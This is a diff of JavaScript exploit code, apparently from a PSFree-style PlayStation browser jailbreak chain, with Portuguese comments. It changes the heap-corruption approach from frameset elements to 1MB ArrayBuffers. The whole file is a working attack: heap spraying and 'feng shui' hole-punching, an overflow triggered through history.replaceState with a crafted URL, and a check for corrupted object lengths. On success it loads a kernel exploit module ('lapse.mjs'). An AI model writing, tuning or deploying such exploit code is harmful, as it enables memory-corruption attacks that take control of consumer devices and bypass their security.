@@ -1,125 +1,89 @@
-/* PSFree Modular: Frameset OOM Detector
-   Target: 1MB Contiguous Object (_size + _data)
-   Success Condition: Memory Error when reading property
-*/
+/* PSFree Modular: ArrayBuffer 1MB Strategy */
 
 import { log, sleep } from './module/utils.mjs';
 
-// --- CONFIGURAÇÃO ---
 const BASE_OFFSET = 709520; 
 const OVERFLOW_AMT = 1024 * 64; 
 
-// Configuração da Vítima (1MB)
-// Total 1MB - 8 bytes header = Dados
-const TARGET_BYTES = 1024 * 1024;
-const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
-const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);
+// Tamanho do ArrayBuffer (1MB)
+const TARGET_SIZE = 1024 * 1024; 
 
 var victims = [];
 
 async function main() {
-    log("=== PSFree: Frameset OOM Detector ===");
-    log("Estratégia: Corromper '_size' e detectar Erro de Memória.");
+    log("=== PSFree: ArrayBuffer Strategy ===");
+    log("Alvo: Corromper 'byteLength' de um ArrayBuffer de 1MB.");
 
-    // 1. WARMUP (Do arquivo psfree.mjs original)
-    // Prepara o alocador para receber objetos grandes no lugar certo
-    log("[1] Aquecendo alocador...");
-    let dummy = "W".repeat(BASE_OFFSET);
-    history.replaceState(dummy, "warmup", null);
-    await sleep(100);
-
-    // Tenta pontes de 0 a 24 bytes (ajuste fino de alinhamento)
-    for (let bridge = 0; bridge <= 24; bridge += 8) {
-        log(`\n[TESTE] Ponte de Zeros: ${bridge} bytes`);
+    // Tenta offsets próximos, caso o header do ArrayBuffer tenha tamanho diferente
+    for (let shift = 0; shift <= 32; shift += 8) {
+        log(`\n[TESTE] Recuo de Offset: -${shift} bytes`);
         
         await prepare_heap();
         
-        // Dispara
-        let success = await trigger_exploit(bridge);
+        // Tenta disparar com o recuo
+        let success = await trigger_exploit(BASE_OFFSET - shift);
         
         if (success) {
             log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
-            log("O sistema tentou alocar memória infinita. Temos controle.", 'green');
-            
-            log("Carregando Kernel Exploit (Lapse)...", 'green');
-            // Carrega a cadeia que usa o seu arquivo 1200.mjs
             await import('./lapse.mjs');
             return;
         }
         
-        // Limpa para a próxima tentativa
         victims = [];
         await forceGC();
     }
     
-    log("Falha. Reinicie o console para limpar o Heap.", 'red');
+    log("Falha.", 'red');
 }
 
 async function prepare_heap() {
     victims = [];
     const SPRAY_COUNT = 80;
 
-    // SPRAY FRAMESET
+    // SPRAY ARRAYBUFFER
     for(let i=0; i<SPRAY_COUNT; i++) {
-        let fset = document.createElement('frameset');
-        fset.rows = ROWS_STRING;
-        victims.push(fset);
+        // Cria ArrayBuffer de 1MB
+        let ab = new ArrayBuffer(TARGET_SIZE);
+        // Preenche com padrão reconhecível (opcional, consome CPU)
+        // let view = new Uint8Array(ab); view[0] = 0x41; 
+        victims.push(ab);
     }
 
-    // BURACOS (Feng Shui)
+    // BURACOS
     for(let i=0; i<SPRAY_COUNT; i+=2) {
-        victims[i].rows = ""; 
         victims[i] = null;
     }
     await forceGC();
 }
 
-async function trigger_exploit(bridgeSize) {
+async function trigger_exploit(offset) {
     try {
-        let buffer = "A".repeat(BASE_OFFSET);
-        
-        // A Ponte: Zeros para alinhar ou pular padding sem causar crash
-        if (bridgeSize > 0) {
-            buffer += "\u0000".repeat(bridgeSize);
-        }
-        
-        // O Ataque: 0x01 no _size
-        // Isso transforma o tamanho em um número gigante
+        let buffer = "A".repeat(offset);
+        // Overflow direto
         buffer += "\x01".repeat(OVERFLOW_AMT);
         
-        history.replaceState({}, "pwn", "/" + buffer);
+        history.replaceState({}, "ab_pwn", "/" + buffer);
 
         return check_victims();
 
     } catch(e) {
-        log("Erro no Trigger (Ignorado): " + e.message);
         return false;
     }
 }
 
 function check_victims() {
     for(let i=1; i<victims.length; i+=2) {
-        let fset = victims[i];
-        if(!fset) continue;
+        let ab = victims[i];
+        if(!ab) continue;
 
-        try {
-            // Tenta ler a propriedade.
-            // Se _size for normal, lê rápido.
-            // Se _size for 0x0101... (Gigante), vai tentar alocar string de Petabytes.
-            let s = fset.rows;
-            
-            // Se leu e o tamanho está visivelmente errado
-            if (s.length !== ROWS_STRING.length) {
-                log(`[JACKPOT] Tamanho alterado detectado: ${s.length}`, 'green');
-                return true;
-            }
-
-        } catch(e) {
-            // AQUI É A VITÓRIA REAL
-            // O Catch pega o erro "Out of Memory" ou "Invalid String Length"
-            log(`[JACKPOT] Erro ao ler Frameset ${i}: ${e.message}`, 'green');
+        // SE O TAMANHO MUDOU:
+        if (ab.byteLength !== TARGET_SIZE) {
+            log(`!!! JACKPOT !!! ArrayBuffer ${i} Length: ${ab.byteLength}`, 'green');
             return true;
         }
+        
+        // Se conseguirmos criar uma view maior que o tamanho original sem erro,
+        // pode ser um sinal silencioso (embora byteLength deva refletir a mudança).
     }
     return false;
 }
